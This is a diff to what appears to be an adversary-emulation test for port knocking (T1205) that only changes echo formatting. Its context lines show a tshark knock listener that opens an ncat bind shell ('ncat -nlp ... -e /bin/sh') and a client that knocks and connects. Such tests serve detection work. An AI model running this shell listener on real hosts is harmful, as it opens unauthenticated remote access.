@@ -64,7 +64,7 @@ atomic_tests:
       done
       TSHARK_FILTER="($TSHARK_FILTER) and inbound"
 
-      echo -e "Listen for sequence for #{max_listen_seconds} seconds\n"
+      echo "Listen for sequence for #{max_listen_seconds} seconds"
       sudo tshark -Q -l -n -f "$TSHARK_FILTER" -T fields -E quote=s -e $PROTOCOL.dstport -a duration:#{max_listen_seconds} > /tmp/t1205_server.dat 2> /dev/null & TSHARK_PID=$!
 
       SEQUENCE_FOUND=0
@@ -73,7 +73,7 @@ atomic_tests:
         echo "debug1"
         grep -qPoz  "$GREP_PATTERN" /tmp/t1205_server.dat 2>&1 /dev/null
         if [ $? -eq 0 ] ; then
-          echo -e "\n\nSequence found..."
+          echo "Sequence found..."
           SEQUENCE_FOUND=1
           kill $TSHARK_PID
           break
@@ -91,7 +91,7 @@ atomic_tests:
 
       echo "Seq: $SEQUENCE_FOUND"
       if [ $SEQUENCE_FOUND -eq 1 ] ; then
-        echo -e "Start shell server; listen for up to #{max_listen_seconds} seconds\n\n"
+        echo "Start shell server; listen for up to #{max_listen_seconds} seconds."
         timeout #{max_listen_seconds}s ncat -nlp #{listening_port} -e /bin/sh
       else
         echo "Sequence not heard..."
@@ -140,14 +140,14 @@ atomic_tests:
         for PORT in $(echo "#{knock_port_sequence}" | sed "s/,/ /g")
         do
           if [ "#{knock_protocol}" = "udp" ] ; then
-            echo -e "Knock\n" | ncat -u -w 1s #{server_ip} $PORT
+            echo "Knock" | ncat -u -w 1s #{server_ip} $PORT
           else
-            echo -e "Knock\n" | ncat -w 1s #{server_ip} $PORT
+            echo "Knock" | ncat -w 1s #{server_ip} $PORT
           fi
           echo "Knock $PORT"
           sleep 0.5s
         done
-        echo -e "Anyone home?  Knock $LOOP of max 5.\n\n"
+        echo "Anyone home?  Knock $LOOP of max 5."
 
         sleep 2s
         echo 'echo Shell to host $HOSTNAME as user $USER successful.'  && sleep 1 | ncat #{server_ip} #{listening_port} > /tmp/t1205_client.dat 2> /dev/null
@@ -155,7 +155,7 @@ atomic_tests:
           SHELL_CONTACTED=1
           break
         else
-          echo -e "Shell not there yet...\n\n"
+          echo "Shell not there yet..."
         fi
       done
 
